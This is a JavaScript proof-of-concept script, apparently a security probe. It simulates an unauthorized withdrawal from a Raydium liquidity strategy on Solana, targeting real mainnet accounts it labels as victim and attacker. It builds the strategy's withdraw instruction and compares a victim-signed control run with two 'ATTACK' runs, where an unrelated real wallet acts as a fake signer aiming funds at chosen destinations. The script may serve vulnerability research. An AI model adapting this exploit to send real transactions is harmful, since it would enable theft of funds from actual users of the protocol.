const { conn, simulate, ix, PublicKey } = require("./lib.js");
const { Market } = require("@project-serum/serum");
const fs = require("fs");
const ANA = __dirname;

const RAY_PROG = "2nAAsYdXF3eTQzaeUQS3fr4o782dDg8L28mX39Wr5j8N";
const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const AMM_AUTHORITY = "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1";
const WSOL = "So11111111111111111111111111111111111111112";
const USDC = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const sleep = ms => new Promise(r => setTimeout(r, ms));

const strategies = JSON.parse(fs.readFileSync(`${ANA}/strategies.json`, "utf8"));
const S = strategies.raydium.find(s => s.strategy === "34eXEXypQiwyQhMRAMbCEJSs16SVaN3C6wzPicEcBTH1");
const VICTIM_INFO = "128bqpQo1PJpPRCTYoAYJShVdzsyaAocpAXugfiVeko";
const VICTIM_MAIN = "7CyNmYZ14RBs9rXKiQmizgpNnPEg4bYsKiskCmJ78fWM";
const ATTACKER = "EPLP12Kd8w48eP5fx8vUEA7g4o1ctFzad25TLVXBpHf7"; // unrelated real user, fake signer
const VICTIM_USDC = "8mjBmjEwmu7rHPVpKMAfF5yvXVivUTZrmdzB3669cJpJ"; // owned by VICTIM_MAIN

function pk(buf, off) { return new PublicKey(buf.slice(off, off + 32)).toBase58(); }

async function tokenAccts(owner, mint) {
  for (let i = 0; i < 4; i++) {
    try {
      const r = await conn.getTokenAccountsByOwner(new PublicKey(owner), { mint: new PublicKey(mint) });
      if (!r.value.length) return null;
      const info = r.value[0].account.data;
      return { addr: r.value[0].pubkey.toBase58(), amount: info.readBigUInt64LE(64).toString() };
    } catch (e) { await sleep(1500 * (i + 1)); }
  }
  return null;
}

(async () => {
  const cacheFile = `${ANA}/../analysis/sim_accounts_cache.json`;
  let cache = fs.existsSync(cacheFile) ? JSON.parse(fs.readFileSync(cacheFile, "utf8")) : {};
  const amm = (await conn.getAccountInfo(new PublicKey(S.ammId))).data;
  const baseVault = pk(amm, 336), quoteVault = pk(amm, 368);
  const openOrders = pk(amm, 496), marketId = pk(amm, 528), targetOrders = pk(amm, 592), serumProg = pk(amm, 560);
  await sleep(500);
  const market = await Market.load(conn, new PublicKey(marketId), { commitment: "confirmed" }, new PublicKey(serumProg));
  const nonceBuf = Buffer.alloc(8); nonceBuf.writeBigUInt64LE(BigInt(market.decoded.vaultSignerNonce.toString()));
  const vaultSigner = await PublicKey.createProgramAddress([new PublicKey(marketId).toBuffer(), nonceBuf], new PublicKey(serumProg));
  const eventQueue = new PublicKey(market.decoded.eventQueue).toBase58();
  const serumBase = new PublicKey(market.decoded.baseVault).toBase58();
  const serumQuote = new PublicKey(market.decoded.quoteVault).toBase58();

  const vUsdc = { addr: VICTIM_USDC };   // real, initialized, owned by VICTIM_MAIN
  const vWsol = { addr: S.tknAccount1 }; // real, initialized, mint=wSOL, owned by strategy authority (wrong owner by design)
  const aUsdc = { addr: VICTIM_USDC };
  const aWsol = { addr: S.tknAccount1 };
  fs.writeFileSync(cacheFile, JSON.stringify(cache, null, 1));
  console.log("dest accts used:", JSON.stringify({ vUsdc, vWsol }));

  const base = {
    strategy: S.strategy, authority: S.authority, tkn0: S.tknAccount0, tkn1: S.tknAccount1, lp: S.lpAccount,
    ammProg: S.ammProgramId, ammId: S.ammId, openOrders, targetOrders, baseVault, quoteVault, serumProg, marketId,
    bids: market.bidsAddress.toBase58(), asks: market.asksAddress.toBase58(), eventQueue, serumBase, serumQuote,
    vaultSigner: vaultSigner.toBase58(),
  };
  function build(signer, t0, t1) {
    const meta = (p, s, w) => ({ pubkey: p, signer: !!s, writable: !!w });
    return [
      meta(signer, true, true), meta(VICTIM_INFO, false, true), meta(t0, false, true), meta(t1, false, true),
      meta(base.strategy, false, true), meta(base.authority, false, true), meta(base.tkn0, false, true), meta(base.tkn1, false, true),
      meta(base.lp, false, true), meta(TOKEN, false, false), meta(base.ammProg, false, false), meta(base.ammId, false, true),
      meta(AMM_AUTHORITY, false, true), meta(base.openOrders, false, true), meta(base.targetOrders, false, true),
      meta(base.baseVault, false, true), meta(base.quoteVault, false, true), meta(base.serumProg, false, false),
      meta(base.marketId, false, true), meta(base.bids, false, true), meta(base.asks, false, true), meta(base.eventQueue, false, true),
      meta(base.serumBase, false, true), meta(base.serumQuote, false, true), meta(base.vaultSigner, false, true),
    ];
  }
  const data = Buffer.from("6f607d39534edca000", "hex");
  const watch = [S.strategy, S.tknAccount0, S.tknAccount1];
  if (vUsdc && vWsol) await simulate([ix(RAY_PROG, data, build(VICTIM_MAIN, vUsdc.addr, vWsol.addr))], watch, "CONTROL: victim signs, victim destinations");
  await sleep(1000);
  if (aUsdc && aWsol) await simulate([ix(RAY_PROG, data, build(ATTACKER, aUsdc.addr, aWsol.addr))], watch.concat([aUsdc.addr, aWsol.addr]), "ATTACK: attacker signer, attacker destinations");
  await sleep(1000);
  if (vUsdc && vWsol) await simulate([ix(RAY_PROG, data, build(ATTACKER, vUsdc.addr, vWsol.addr))], watch.concat([vUsdc.addr, vWsol.addr]), "ATTACK2: attacker signer, victim destinations");
})().catch(e => { console.error("FATAL", e); process.exit(1); });
